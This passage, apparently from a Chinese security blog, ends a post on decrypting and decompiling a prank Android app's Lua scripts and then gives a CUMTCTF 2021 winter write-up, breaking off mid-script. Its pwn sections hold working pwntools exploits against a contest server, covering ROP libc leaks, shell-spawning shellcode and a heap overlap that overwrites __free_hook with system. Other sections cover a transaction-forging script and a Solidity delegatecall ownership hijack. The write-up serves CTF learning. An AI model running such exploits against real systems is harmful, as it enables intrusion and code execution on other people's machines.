a5);\n}\n```\n\n![image-20210330160703541](https://i.loli.net/2021/03/30/qL7plJKnNtZITur.png)\n\n参数名是改过的，if语句判断是否需要解密，否则直接执行j_lua_load加载文件，\n\n找到了原函数然后了解各个参数的意义进行逆向即可，(其实不算逆向而是正向逻辑再走一遍就行)，\n\n或者IDA动调在return上面下个断点，当程序执行到这后dump出内存数据也行\n\n```c\n>LUALIB_API int luaL_loadbufferx (lua_State *L, const char *buff, size_t size,\n                                 const char *name, const char *mode) {\n  LoadS ls;\n  ls.s = buff;\n  ls.size = size;\n  return lua_load(L, getS, &ls, name, mode);\n}\n```\n\n逆向脚本如下\n\n```python\nfrom ctypes import *\nimport sys\ndef decrypt(filename):\n    s = open(filename, 'rb').read()\n    outfile = 'out.lua'\n    if s[0] == chr(0x1b) and s[1] != chr(0x4c):\n        rst = chr(0x1b)\n        size = len(s)\n        v10 = 0\n        for i in range(1, size):\n            v10 += size\n            v = (c_ulonglong(-2139062143 * v10).value >> 32) + v10\n            v1 = c_uint(v).value >> 7\n            v2 = c_int(v).value < 0\n            rst += chr(ord(s[i]) ^ (v10 + v1 + v2) & 0xff)\n        with open(outfile, 'wb') as f:\n            f.write(rst)\n    else:\n        pass\ndef foo():\n    # print len(sys.argv)\n    if len(sys.argv) == 2:\n        filename = sys.argv[1]\n    else:\n        filename = 'main.lua'\n    decrypt(filename)\nif __name__ == '__main__':\n    foo()\n```\n\n（其中ctypes之前用过，又忘了，在这记一下）\n\n然后解密三个lua\n\n![image-20210327000258919](https://i.loli.net/2021/03/27/lw13gM2RXAvLWHh.png)\n\n还是乱码，于是搜索LuaS，了解到与Python生成pyc字节码一样，Lua程序也有自己的字节码格式luac。Lua程序在加载到内存中后，Lua虚拟机环境会将其编译为Luac字节码\n\n需要用工具反编译\n\n```\njava -jar .\\unluac_2021_03_19b.jar .\\out.lua > main.lua\n```\n\n于是得到源码main.lua\n\n```java\nrequire(\"import\")\nimport(\"android.app.*\")\nimport(\"android.os.*\")\nimport(\"android.widget.*\")\nimport(\"android.view.*\")\nimport(\"android.view.View\")\nimport(\"android.content.Context\")\nimport(\"android.media.MediaPlayer\")  //播放器\nimport(\"android.media.AudioManager\")   //音量控制\nimport(\"com.androlua.Ticker\")\nactivity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI) //调大音量\nactivity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)//隐藏系统导航栏，并进入沉浸模式（全屏）\nm = MediaPlayer()\nm.reset()\nm.setDataSource(activity.getLuaDir() .. \"/mc.mp3\") //广告\nm.prepare()\nm.start()\nm.setLooping(true)//循环\nti = Ticker() //计时器触发\nti.Period = 10  //间隔10\nfunction ti.onTick()\n  activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)//同上\n  activity.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)//隐藏navbar\nend\nti.start()//开启ticker，每10ms执行一次上面的函数\nfunction onKeyDown(A0_0, A1_1) //监听按键\n  if string.find(tostring(A1_1), \"KEYCODE_BACK\") ~= nil then //如果按键是返回键\n    activity.getSystemService(Context.AUDIO_SERVICE).setStreamVolume(AudioManager.STREAM_MUSIC, 15, AudioManager.FLAG_SHOW_UI)\n  end //相当于把返回键变成了音量最大键\n  return true\nend\n```\n\n大体流程如下：\n\n将系统音量调至最大\n\n隐藏系统导航栏，并进入沉浸模式（全屏）\n\n每10tick，重复以上步骤使得无法主动调低音量\n\n循环播放音频文件`mc.mp3`，并劫持返回键\n\n(仅当两次返回的时间间隔小于0秒是才会退出软件，否则就会一直播放音乐)\n\n如果锁定你的home键，然后再实现开机自启动，这样的话，这种软件就可以变成流氓勒索软件了\n\n# 0x02 小结\n\n这样看来似乎程序并没什么危害，只是个恶搞软件\n\n不要随便安装来历不明的软件，apk安装包实在是太容易被改包了。\n\n![img](https://pic4.zhimg.com/80/v2-f419c927151fbeb12d25e9f5881c38cf_720w.jpg?source=1940ef5c)\n\n\n\n**reference：**  https://cloud.tencent.com/developer/article/1718949","tags":["KNOWLEDGE"],"categories":["LEARNING"]},{"title":"CUMTCTF2021 Winter 部分wp","url":"/2021/02/01/cumtctf2021/","content":"\n# 0x00 前言\n\n老师让搞的一次寒假赛，一共7天... 没打，抽空上去做了做题目\n\n主要看了密码和misc，跟着炜哥学了一点智能合约，还是挺有收获的\n\n# 0x01 PWN\n\n## 1.pwn1\n\n简单ROP，，，貌似程序提供的栈地址没什么用，，，可以直接泄露got地址\n\n但本着充分利用题目所给条件的原则，可以选择泄露栈地址\n\n```python\nfrom pwn import *\nelf=ELF('./pwn1')\nlibc = ELF('libc6-i386_2.23-0ubuntu11.2_amd64.so')\n# p = elf.process()\ncontext.log_level = 'debug'\np = remote('219.219.61.234',40000)\n\nprintf_plt=elf.plt['printf']\nread_got=elf.got['read']\nmain_addr=0x080484EB\ninfo(\"printf_plt = \" + hex(printf_plt))\np.recv()\n# buf = int((p.recvline().strip('\\n'))[-8:],16)\n# info(\"buf : \"+ hex(buf))\n# payload=28*'a'+'b'*4+ p32(printf_plt)+p32(main_addr)+p32(buf+0x30)\npayload=28*'a'+'b'*4+ p32(printf_plt)+p32(main_addr)+p32(read_got)\np.sendline(payload)\n# libc_base=u32(p.recv(4)) - libc.sym['__libc_start_main'] -247\nlibc_base=u32(p.recv(4)) - libc.sym['read']\ninfo(\"libc_base : \" + hex(libc_base))\nsystem_addr = libc_base + libc.sym['system']\nbin_sh_addr = libc_base + libc.search('/bin/sh\\x00').next()\npayload2=0x1c*'a'+p32(0)+p32(system_addr)+p32(0)+p32(bin_sh_addr)\np.sendline(payload2)\np.interactive()\n#CUMTCTF{97a866db5e67c9cc6a553e211}\n```\n\n## 2.easystack\n\n还记得你当年名字叫start，怎么就改名了呢/滑稽\n\n```python\nfrom pwn import *\ncontext.log_level = \"debug\"\n# p = process('./easystack')\np = remote('219.219.61.234',20002)\npayload = 'A'*0x10 + p32(0x8048087)\np.sendafter(\"winter:\",payload)\nesp = u32(p.recv(4))\ninfo(hex(esp))\nprint 'esp: '+hex(esp)\nshellcode='\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80'\n#shellcode = asm('xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov al,0xb;int 0x80')\npayload = 'A'*0x10 + p32(esp+0x10) + shellcode\np.sendline(payload)\np.interactive()\n\n#CUMTCTF{Hello_pwn_this_is_stack_overfl0w}\n```\n\n## 3.pwn3\n\n最基础的栈迁移，没canary并且程序告诉了栈地址，迁移到栈上即可\n\n```python\nfrom pwn import *\ncontext.log_level=\"debug\"\n# context.arch='amd64'\nelf=ELF('./pwn3')\n# p=elf.process()\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") \np=remote(\"219.219.61.234\",40001)\n\nleave_ret=0x0000000000400896\npop_rdi=0x0000000000400963\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\np.recvuntil(\"a present:0x\")\nstack=int((p.recvline().strip('\\n')),16)\ninfo(hex(stack))\n\npayload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt) +p64(0x400898) \npayload+=p64(stack-8)+p64(leave_ret)\np.send(payload)\np.recv()\nlibc_base =u64(p.recvline().strip('\\n')[-6:].ljust(8,\"\\x00\")) - libc.sym['puts']\ninfo(hex(libc_base))\nsystem=libc_base+libc.sym['system']\nbinsh =libc_base + libc.search('/bin/sh\\x00').next()\np.recvuntil(\"a present:0x\")\nstack=int((p.recvline().strip('\\n')),16)\ninfo(hex(stack))\n\npayload2=p64(pop_rdi) +p64(binsh)+p64(system)+p64(0x400898) \npayload2+=p64(stack-8)+p64(leave_ret)\np.send(payload2)\np.interactive()\n#CUMTCTF{22e369b8e6a571db987cec98}\n```\n\n## 4.pwnvm\n\n虚拟机+栈溢出+沙盒orw![image-20210130171347058](https://i.loli.net/2021/01/30/HgNusO9G1jZrqQF.png)\n\n见2020_9月博客 ==> [vmpwn](https://ld1ng.com/2020/09/28/Sep_Match/#0x01-gactf-vmpwn)\n\n## 5.pwn8\n\n利用uaf漏洞，分割unsortedbin，通过构造获得fastbin，没有输出函数，爆破stdout泄露libc基址，最后将fd改为malloc_hook-0x23，从而将malloc_hook改为onegadget getshell\n\n![image-20210130170848487](https://i.loli.net/2021/01/30/vCypuJcw3iakYhd.png)\n\n详细见2020_11月博客==> [上海赛wp](https://ld1ng.com/2020/11/30/Nov_Match/#0x05-%E4%B8%8A%E6%B5%B7%E8%B5%9B-maj0rone)\n\n## 6.babyheap\n\n主要在于tcache块的构造，尝试了好几种思路都失败了，并没找到特别取巧的思路\n\n本题特点在于用realloc分配，并且只有一个全局变量存储，所以add和delete总是要成对出现\n\n漏洞在add时有个offbyone，所以可以构造堆重叠，然后通过一系列的overlap来修改fd指针并申请到stdout，爆破泄露出libc基址，因为我们关闭了stdout，所以我们要用输出重定向 1>&2，然后修改free_hook为system即可\n\n```python\n# encoding=utf-8\nfrom pwn import *\nelf = ELF('./babyheap')\n# context.log_level = \"debug\"\nlibc = ELF('/home/ld1ng/tools/glibc-all-in-one-master/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so')\n\ndef add(size, content=\"\\n\"):\n    p.sendlineafter(\"choice:\", \"1\")\n    p.sendlineafter(\"Size:\", str(size))\n    p.sendafter(\"Data:\", content)\n\ndef delete():\n    p.sendlineafter(\"choice:\", \"1\")\n    p.sendlineafter(\"Size:\", str(0))\n\ndef add2(size, content=\"\\n\"):\n    p.sendline(\"1\")\n    sleep(0.1)\n    p.sendline(str(size))\n    sleep(0.1)\n    p.send(content)\n    sleep(0.1)\n\ndef delete2():\n    p.sendline(\"1\")\n    sleep(0.1)\n    p.sendline(str(0))\n    sleep(0.1)\n\ndef colse1():\n    p.sendlineafter(\"choice:\", \"2\")\n\nDSZIE = 0x4f0\nwhile True:\n    p = elf.process()\n    # p  = remote('219.219.61.234',20030)\n    for i in range(6):\n        add(DSZIE)\n        add(0x80)\n        delete()\n\n    add(DSZIE)\n    add(0xa8)\n    delete()\n\n    add(DSZIE)\n    add(0x80)\n    delete()\n\n    add(DSZIE)\n    add(0x28)\n    delete()\n\n    add(DSZIE)\n    add(0x28)\n    delete()\n\n    add(DSZIE)\n    add(0x48)\n    delete()\n\n    add(DSZIE)\n    add(0x28)\n    delete()\n\n    add(0x3c0)\n    add(0x80)\n    delete()\n    #unsortedbin\n    add(0xa8, \"a\" * 0xa8 + \"\\xf1\")\n    delete()\n\n    add(0x88)\n    delete()\n    # gdb.attach(p)\n    add(0xe8, \"a\" * 0x98 + p64(0x21) + \"\\x00\" * 0x18 + p64(0x21) + \"\\xe0\")\n    delete()\n\n    add(0x48, \"a\" * 0x48 + \"\\xc1\")\n    delete()\n    add(0x28)\n    delete()\n    add(0xb8, \"a\" * 0x28 + p64(0x91) + '\\x60\\x07\\xdd')\n    delete()\n    gdb.attach(p)\n    add(0xe8, \"a\" * 0x98 + p64(0x21) + \"\\x00\" * 0x18 + p64(0x41))\n    delete()\n\n    add(0x28)\n    delete()\n    add(0x28)\n    delete()\n    try:\n        add(0x28, p64(0xfbad3887) + p64(0) * 3 + \"\\x00\")\n        p.recvuntil(p64(0xfbad3887), timeout=1)\n        # gdb.attach(p)\n        p.recv(0x18)\n        libc_base = u64(p.recv(8)) - 0x3ec700\n        libc.address = libc_base\n        info (\"libc_base : \" + hex(libc.address))\n        if \"\\x7f\" in p64(libc.address):\n            break\n    except EOFError:\n        p.close()\n        continue\ncolse1()\np.recvuntil(\"Bye\")\npayload = \"a\" * 0x98 + p64(0x21) + \"\\x00\" * 0x18 + p64(0x61) + p64(libc.sym['__free_hook'] - 0x18) + b\"\\n\"\nadd2(0xe8, payload)\ndelete2()\n\nadd2(0x38)\ndelete2()\npayload2 = \"exec /bin/sh 1>&2\\0\".ljust(0x18, \"\\x00\") + p64(libc.sym['system']) + \"\\n\"\nadd2(0x38, payload2)\ndelete2()\n\np.interactive()\n```\n\n爆破两位1/256的概率，脸太黑了远程没爆出来，不过本地测试成功\n\n![image-20210131014951959](https://i.loli.net/2021/01/31/dRuBJ37qPSZATHE.png)\n\n***reference：***\n\n[湖湘杯2020wp](https://www.anquanke.com/post/id/221334#h2-2)\n\n## 7.pwnserver\n\n一道模拟服务器的题目\n\n本来是想把ptrace(PTRACE_TRACEME, 0, 0, 0)反调试关掉的，PIE也关掉，放出来玩玩的，结果不知道是dockerfile有问题还是环境有问题，自己远程都没打通，再加上7天大家应该都累了，就没放\n\n# 0x02 CRYPTO\n\n## 1.简单的RSA\n\n```python\nfrom Crypto.Util.number import *\nfrom secret import flag\ndef keygen(nbit):\n    while True:\n        p, q, r = [getPrime(nbit) for i in range(3)]\n        if isPrime(p + q + r):\n            pkey = (p * q * r, p + q + r)\n            privtekey = (p, q, r)\n            return pkey, privtekey\ndef encrypt(msg, pubkey):\n    enc = pow(bytes_to_long(msg.encode('utf-8')), 4097, pkey[0] * pkey[1])\n    return enc\n\npkey, _ = keygen(512)\nenc = encrypt(flag, pkey)\nprint('pkey =', pkey)\nprint('enc =', enc)\n```\n\n靠着Google的力量\n\n![image-20210125222440426](https://i.loli.net/2021/01/25/6AzThEMr4YnIcdB.png)\n\n总的来说就是如果flag足够小，以至于可以认为能够只用key2(p+q+r质因子)解密，这样就是可以很快解出答案\n\n脚本如下\n\n```python\nfrom Crypto.Util.number import *\n\npubkey = (1251709577626510958494791062667676243734790366011491246986675733462349082344175537453771621121071766669797697717917746631186730725083409823551331041259926857211364206399038556008882780372855437508183600896784538740213036545604184332069924635733237483487108196741742913693788926280985195680223402990853248300811764270645645433228544946675281537724600096480759192450265887279376728709415106679135570449965771369087189818628308500388459719506931876195584599535690337, 33168381182273613039378043939021834598473369704339979031406271655410089954946280020962013567831560156371101600701016104005421325248601464958972907319520487)\nenc = 15648371218931722790904370162434678887479860668661143723578014419431384242698608484519131092011871609478799077215927112238954528656254346684710581567304227780228595294264728729958171950314042749100472064919234676544341981418897908716041285489451559413615567610248062182987859379618660273180094632711606707044369369521705956617241028487496003699514741969755999188620908457673804851050978409605236834130689819372028797174206307452231481436775711682625666741103384019125790777595493607264935529404041668987520925766499991295444934206081920983461246565313127213548970084044528257990347653612337100743309603015391586841499\n\nd = inverse(0x1001, pubkey[1]-1)\nprint(long_to_bytes(pow(enc, d, pubkey[1])))\n#CUMTCTF{54def9aa832be5c6e77d213c6d5}\n```\n\n## 2.乱写的密码\n\n人要看傻了，@文桑\n\n程序逻辑就是随机编排了字母表，实在没想出方法，试试统计分析\n\n看到`krveked{fwgzszymyeu_eql0wu1trtldrm}`\n\n盲猜开头是cumtctf，然后根据正文的双字母及三字母的组合猜测对应关系\n\n得到flag: `cumtctf{probability_the0ry1suseful}`////吐血\n\n方法太蠢了，坐等官方wp...\n\n------\n\n破案了，果然有工具：[词频分析](https://quipqiup.com/)\n\n## 3.出来签到啦\n\n两关，第一关是AES_CBC，刚好最近考完密码学\n\n```python\nkey = \"19e6855d293a1b76ff44f18948b19bad\"\nplainText = \"Can_You_Find_me?\"\nIV=?\nflag=?\naes = AES.new(key, AES.MODE_CBC, iv)\naes1 = AES.new(key, AES.MODE_CBC, iv)\ncipherText1=aes.encrypt(plainText)\ncipherText=aes1.encrypt(flag)\n#flag为下一关的密码\n```\n\n现在已知cipherText、cipherText1和key，只要求出IV即可得到flag\n\n这里可以回顾一下刚刚过去的密码学课本，写几个式子直观一点，\n\n$$\nC1 = E(P1 ⊕ IV)\\\\\\P1 = D(C1) ⊕ IV\n$$\n\n\n这里我们要做的是伪造一个fakeIV，可得\n$$\nfakeP = D(C1) ⊕ fakeIV\\\\\\D(C1) = fakeP ⊕ fakeIV\\\\\\∵ D(C1) = P1 ⊕ IV\\\\\\∴ IV = fakeP ⊕ fakeIV ⊕ P1\n$$\n\n所以脚本如下：\n\n```python\nfrom Crypto.Cipher import AES\n\nkey = \"19e6855d293a1b76ff44f18948b19bad\".decode(\"hex\")\ncipherText1 = \"97FB685D28FC895BB1617CDA1E6C4D76\".decode(\"hex\")\ncipherText = \"D0EC67CCCF6B2BB057C4FAA168FA670C12CBB3D5D058968FF60426F95344A84B\".decode(\"hex\")\n# print type(cipherText1)\n# print cipherText\nplainText = \"Can_You_Find_me?\"\nfakeIV = \"0123456789abcdef\"\nfAes = AES.new(key, AES.MODE_CBC, fakeIV)\nfakeP = fAes.decrypt(cipherText1)\niv = \"\"\nfor i in range(16):\n   iv += chr(ord(fakeP[i])^ord(fakeIV[i])^ord(plainText[i]))\naes = AES.new(key, AES.MODE_CBC, iv)\nflag = aes.decrypt(cipherText)\nprint flag\n#key{OhOh_You_Find_It}!!!!!!!!!!!\n```\n\n输入口令OhOh_You_Find_It，打开challenge2\n\n是一个线性反馈移位寄存器，\n\n```python\nflag = \"bxsyyds{xxxxxxx}\nassert flag.startswith(\"bxsyyds{\")\nassert flag.endswith(\"}\")\nassert len(flag)==16\n\ndef lfsr(R,mask):\n    output = (R << 1) & 0xfffffff\n    i=(R&mask)&0xfffffff\n    lastbit=0\n    while i!=0:\n        lastbit^=(i&1)\n        i=i>>1\n    output^=lastbit \n    return (output,lastbit)\n\nR=int(flag[8:-1],16)\nmask=0b1001000000100000001000100101\nf=open(\"result\",\"w\")\nfor i in range(100):\n    tmp=0\n    for j in range(8):\n        (R,out)=lfsr(R,mask)\n        tmp=(tmp << 1)^out\n    f.write(chr(tmp))\nf.close()\n```\n\n简单来说就是每一时刻的序列与mask按位与之后的结果逐位异或，放在序列末尾，首字母输出，就这样每8位输出一个字节写入result，共100个字节\n\n很明显寄存器长度为28（7个字节），并且很容易得到反馈函数，(1&any = any ; 0^any = any )\n\n所以lastbit实质上就是当前序列对应mask位的值进行异或，而我们已知输出序列的前27位，即可求出flag的最后一位，以此类推，最后即可得到完整flag\n\n```python\nmask = '1001000000100000001000100101'\nresult = '1000000101111010010001111100'\n\ntmp = result\nR = ''\nfor i in range(28):\n    output = '0' + result[:27]\n    lastbit = int(tmp[-1-i])^int(output[-1])^int(output[-3])^int(output[-6])^int(output[-10])^int(output[-18])^int(output[-25])\n    R += str(lastbit)\n    result = str(lastbit) + result[:27]\n\nR = hex(int(R[::-1],2))[2:]\nflag = \"cumtctf{\" + R + \"}\"\nprint flag\n#cumtctf{5201314}\n```\n\n## 4.fakeRSA\n\n题目描述\n\n```python\nfrom Crypto.Util.number import *\n\np = getPrime(1024)\nq = getPrime(1024)\nn = p * q\nphi = (p - 1) * (q - 1)\ne = 65537\n\nwith open('./flag.txt', 'r') as r:\n    flag = r.read()\nflag = flag.split(' ')\ncipher = []\nfor word in flag:\n    tmp_cipher = []\n    for char in word:\n        tmp_cipher.append(pow(ord(char), e, n))\n    cipher.append(tmp_cipher)\n\nwith open('./cipher.txt', 'w+') as w:\n    w.write('cipher = ' + str(cipher))\n    w.write('\\nn = ' + str(n))\n    w.write('\\ne = ' + str(e))\n    w.write('\\n众所周知，RSA属于公钥密码算法，那么加解密就只需要用到公钥，没有什么问题')\n```\n\ncipher是个二维数组，两两一组，很奇怪（其实就是对明文每个字母分别加密）\n\n没管那么多，直接对所有密文爆破\n\n在可见字符范围内，数量并不多\n\n脚本如下：\n\n```python\nn = 12457981652507620082899382981019023150522130836049180768230343208048934250515055225919349467798787130145322363535840724320789633007392777695461819640437560640209852226105362332801576692429778616279117389786582662174560154469003170305006785551902344355335769435756760811102857819829329033582792826564656344565450265474296871162147060177241714540253604539780517460406770813062769099245157298730033826355717057929207255864286698539967655185399554949075313213370119868838885318633758295272070101734349060701723266336600294581259003531484934286818352843046724120072304901058035864828216652283864232249168467598307241102541\ne = 65537\nwith open('1.txt' , 'r') as f:\n    c = f.read().split(',')\nc = [int(i) for i in c]\nflag = ''\nfor cipher in c:\n    for i in range(48,127):\n        if pow(i , e , n) == cipher:\n            flag += chr(i)\n            break\nprint(flag)\n```\n\n![image-20210128001412466](https://i.loli.net/2021/01/28/YOsM76tIXfFroPC.png)\n\n\n\n## 5.Pocketbook\n\nnc 过去\n\n```python\n[$] Welcome to CUMTCTF'winter\n[+] sha256(AuQVuDXG+?).binary.endswith('00000')\n[-] ?=\n```\n\nsha256只爆破最后一位即可，通过验证后进入是一个交易系统\n\n```c\n1. Transfer //交易\n2. View transaction information  //查看交易单号\n3. Submit transaction information to me  //提交单号\n4. get flag(pay 10000)  //买flag\n```\n\n出生10块钱，赚够10000就可以买flag\n\n这里要做是就是伪造单号，48位的单号16位一组可以分为3组，分别是sender/receiver/amount\n\n可以先自己给ljzjsc转10块钱，然后获得自己的单号，然后在看其他单号分别截取下来，就可以拼凑出新的伪造好的单号，然后反复提交，直到赚够10000即可\n\n思路很简单，脚本如下\n\n```python\nimport hashlib\nfrom pwn import *\n# context.log_level = 'debug'\np = remote('219.219.61.234',20040)\np.recvuntil('(')\nm = str(p.recv(8))\n# print m\ndic=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"\nfor i in dic:\n    s = m+i\n    h=str(bin(int(hashlib.sha256(s).hexdigest(),16))[2:])\n    if h.endswith('00000'):\n        print(i)\n        p.sendline(i)\n        break\np.recvuntil('name')\nprint('login success')\np.sendline('ld1ng')\np.sendline('1')\np.sendline('ljzjsc')\np.sendline('10')\np.recvuntil('hash:')\nrecord = str(p.recv()).strip('\\n')\nrecevier = record[:16]\n\np.sendline('2')\nrecord = str(p.recvline())\nfakerecord = ''\nfakerecord+=record[:16] + recevier + record[32:]\nprint \"sender: \" + record[:16]\nprint 'recevier: '+ recevier\nprint 'amount: '+ record[32:]\nprint \"fakerecord: \" + fakerecord\n\nwhile(1):\n    p.recvuntil(\"Account Balance:\")\n    balance = p.recvline()\n    print balance\n    p.sendline('3')\n    p.send(fakerecord)\n    if(int(balance)>=10000):\n        break\np.interactive(\"$ld1ng\")\n```\n\n坐等余额变为10000就行\n\n![image-20210128185332741](https://i.loli.net/2021/01/28/yPdVivzpHL7rAJ3.png)\n\n## 6.ezRSA\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom secret import *\n\n# tip： 2*x*y*beta + x + y\nif is_prime(beta) and len(bin(beta)[2:]) == 512:\n    if len(bin(x)[2:]) == len(bin(y)[2:]) :\n        p = 2 * x * beta + 1\n        q = 2 * y * beta + 1\n        if is_prime(p) and is_prime(q):\n            n = p * q\n            e = 65537\n            m = bytes_to_long(flag.encode())\n            enc = powmod(m, e, n)\n            print(n)\n            print(e)\n            print(beta)\n            print(enc)\n# n=\n# e=\n# beta=\n# enc=\n```\n\n这里可以得到这些等价关系\n\n\n$$\nn=pq=4xyβ^2+2xβ+2yβ+1\\\\\\tip = 2xyβ + x + y\\\\\\∴tip = n-1/2β\\\\\\tip ≡ x+y(mod β) = x+y+kβ\n$$\n\n所以，可以爆破k得出x，y的值，进而得到*φ*(*n*)\n\n```python\nfrom Crypto.Util.number import *\nfrom gmpy2 import *\nn =\ne = 65537\nenc = \nbeta =\ntip = (n-1)//(2*beta)\nfor k in range(10000):\n    x_add_y = tip % beta + beta*k\n    x_mul_y = (tip - x_add_y)//(2*beta)\n    try:\n        x_sub_y = iroot(x_add_y**2 - 4*x_mul_y,2)\n        if x_sub_y[1]:\n            y = (x_add_y - x_sub_y[0] )//2\n            x = x_add_y - y\n            p = 2*y*beta + 1\n            q = 2*x*beta + 1\n            phi = (p-1)*(q-1)\n            d = inverse(e,int(phi))\n            print (long_to_bytes(pow(enc,d,n)))\n    except:\n        pass\n#CUMTCTF{2cbbebe1-79d1-4733-8a8f-53f4396476d3}\n```\n\n# 0x03 MISC\n\n## 1.大鸟转转转\n\ngif图片，用工具一帧一帧翻就行\n\n![image-20210125225811863](https://i.loli.net/2021/01/25/6ho5a3IMmc4LxVH.png)\n\n话说，少了个F谁发现了！\n\n## 2.没别的意思给你签个到顺便给你看看我老婆\n\n不用看都知道是谁出的题啊喂@ljzjsc\n\n![image-20210125230306456](https://i.loli.net/2021/01/25/rALxnbogtIp9VKB.png)\n\n## 3.程序软件工程师\n\nbase64隐写，都是脚本的锅，害得我动调了半天\n\n![image-20210127190129651](https://i.loli.net/2021/01/27/TSa1Kf7GCOm8lYZ.png)\n\n## 4.夜之城之王\n\nV哥亲自录视频，一开始就是lmhash爆破，但是36的14次方太大了，我的小电脑吃不消，于是放弃了\n\n好在出题人给了6位的提示，再加上本人0.5倍速的细心观察，很容易找到一些线索，于是3个字的爆破可以说秒出结果😂\n\n```python\nimport passlib.hash;\ndic = \"1234567890QWERTYUIOPASDFGHJKLZXCVBNM\"\nm = ''\nfor a in dic:\n    for b in dic:\n        for c in dic:\n                m =\"1999FLAG\"+a+b+c+\"7er\"\n                if(passlib.hash.lmhash.encrypt(m)==\"32b2e7cfe24f673139251c6f310dee73\"):\n                    print(\"passwd is : \" + m)\n                    print(\"success!\")\n                    exit(0)                                              \nprint(\"NO RESULT\")\n#passwd is :1999FLAG1227er\n```\n\n## 5.helloBlockchain\n\n智能合约的交互，开始我的钱包没钱一直无法部署，多亏ljzjsc推荐了一个新的水龙头\n\n![image-20210129100729118](https://i.loli.net/2021/01/29/CoYjzD2mqBuJOWE.png)\n\n我的钱包才终于有了一块钱\n\n![image-20210129100855009](https://i.loli.net/2021/01/29/jgsBYV3ioDATE9a.png)\n\n然后题目是这样的，给了源码，\n\n```c\npragma solidity ^0.5.13;\n\ncontract HelloWorld {\n    string hello = \"Welcome to cumtctfwinter!!! You will find this so easy ~ Happy happy :D\";\n    event SendFlag(string email);\n    function getflag(string memory email) public returns(string memory){\n        emit SendFlag(email);\n        return hello;\n    }\n}\n```\n\ngetflag方法传入参数(这里是邮箱)，就可以触发SendFlag事件，就可以得到flag了\n\n首先要部署自己的合约，然后在At Address处填入目标合约\n\n![image-20210129101518304](https://i.loli.net/2021/01/29/w9mRItuYhPaMV5T.png)\n\n可以去查看目标合约的交易记录，\n\n![image-20210129101755349](https://i.loli.net/2021/01/29/Go7wHAlTC6chxZp.png)\n\n成功后到自己邮箱查看即可\n\n![image-20210129101207405](https://i.loli.net/2021/01/29/RlTj1XVCnx8vsiG.png)\n\n## 6.easyblock\n\n同样的环境，也提供了合约源码\n\n```c\npragma solidity ^0.4.23;\ncontract hanker {\n  address public owner;\n  address public nameContract;\n  uint hellocumtname;\n  string hello = \"Welcome to cumtctfwinter!!! You will find this so easy ~ Happy happy :D\";\n  event SendFlag(string email);\n  bytes4 constant set = bytes4(keccak256(\"changename(uint256)\"));\n  constructor() public {\n    nameContract = 0x746C5707Bfd8a4Be44332F21AC78A28e9340a9F4; \n    owner = msg.sender;\n  }\n\n  function getflag(string memory email) public{\n        require(msg.sender == owner);\n        emit SendFlag(email);\n    }\n  \n  function setname(uint _namenow) public {\n    nameContract.delegatecall(set, _namenow);\n  }\n}\n \ncontract nameContract {\n  uint hellocumtname;\n  function changename(uint _name) public {\n    hellocumtname = _name;\n  }\n}\n```\n\n这里的危险函数是delegatecall\n\n`delegatecall:`调用后内置变量`msg` 的值不会修改为调用者，但执行环境为调用者的运行环境。（相当于复制被调用者的代码到调用者合约）\n\n出题人是这样解释的：\n\n![image-20210129212600390](https://i.loli.net/2021/01/29/zumxURvLlo1dgQW.png)\n\n\n\n所以说当调用nameContract合约的changename时，改变的并不是本合约内的hellocumtname变量，而是将owner地址改变(我以为要想办法执行构造函数所以一直在尝试合约实例化)，\n\n那既然这样就可以通过changename方法输入自己的地址，这样owner变量就被我们修改了\n\n然后执行getflag方法即可。\n\nps：当时油不够怎么也发不出去，然后提了limit之后就可以了\n\n![image-20210129211902253](https://i.loli.net/2021/01/29/uKGIMtUTB3EA4h5.png)\n\n## 7.backdoor\n\nwireshark抓包就行，flag是个ip地址\n\n# 0x04 REVERSE\n\n## 1.re1\n\n![image-20210126180032593](https://i.loli.net/2021/01/26/467tHom8j2AgWBb.png)\n\n关键函数，很明显的base58的特征，直接工具解\n\n![image-20210126180126919](https://i.loli.net/2021/01/26/pxtMrIgjAPNEwGR.png)\n\n## 2.re2\n\n手动脱壳，用x32dbg出了一点问题，脱完没法运行\n\n![img](https://i.loli.net/2021/01/26/wlLAHOzmhu98bVU.png)\n\n加密逻辑很复杂，直接进入最后的比较函数\n\n![image-20210126171357756](https://i.loli.net/2021/01/26/XYox4deqPVvG67S.png)\n\n很明显加密后数据和内存数据进行比较，那么只要知道加密逻辑就可以了\n\n这里选择动调，由于当时脱壳没脱好，于是乎我直接用带壳的程序调试\n\n内存数据：\n\n![image-20210126171702705](https://i.loli.net/2021/01/26/cVaC9lQueoh7jwq.png)\n\n输入32个'a'之后的加密数据：\n\n![image-20210126171810196](https://i.loli.net/2021/01/26/U4xIrdisn7CAuXb.png)\n\n![image-20210126171932577](https://i.loli.net/2021/01/26/g8DtIY9FvKQOicG.png)\n\n脚本如下：\n\n```python\n\ns = [0x1A, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x14, 0x00, \n  0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x1A, 0x00, 0x00, 0x00, \n  0x0D, 0x00, 0x00, 0x00, 0x1F, 0x00, 0x00, 0x00, 0x22, 0x00, \n  0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, \n  0x2F, 0x00, 0x00, 0x00, 0x3C, 0x00, 0x00, 0x00, 0x06, 0x00, \n  0x00, 